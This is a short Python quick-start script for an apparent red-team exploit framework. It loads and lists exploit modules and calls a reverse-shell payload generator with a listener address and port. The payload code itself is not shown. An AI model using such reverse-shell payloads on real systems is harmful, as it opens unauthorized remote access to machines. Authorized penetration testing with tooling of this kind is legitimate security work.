#!/usr/bin/env python3
"""
Quick Start Script - Example Usage
Author: Security Research Team
"""

import sys
from pathlib import Path

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

from framework import ExploitFramework

def main():
    print("=" * 80)
    print("Red Team Exploit Framework - Quick Start")
    print("=" * 80)
    print("\n??  WARNING: Authorized use only!")
    print("\nThis script demonstrates basic framework usage.")
    print("For actual testing, use: python3 framework.py -i\n")
    
    framework = ExploitFramework()
    
    # Load modules
    print("[*] Loading modules...")
    framework.load_all_modules("modules")
    
    modules = framework.list_modules()
    print(f"[+] Loaded {len(modules)} modules:")
    for mod in modules:
        info = framework.get_module_info(mod)
        if info:
            print(f"    - {mod}: {info.get('description', 'N/A')}")
    
    print("\n[*] Example payload generation...")
    from payloads.reverse_shell import generate as gen_reverse
    payload = gen_reverse(host="192.168.1.100", port=4444, language="python")
    print(payload[:500] + "...")
    
    print("\n" + "=" * 80)
    print("For interactive mode, run: python3 framework.py -i")
    print("For help, run: python3 framework.py --help")
    print("=" * 80)

if __name__ == "__main__":
    main()
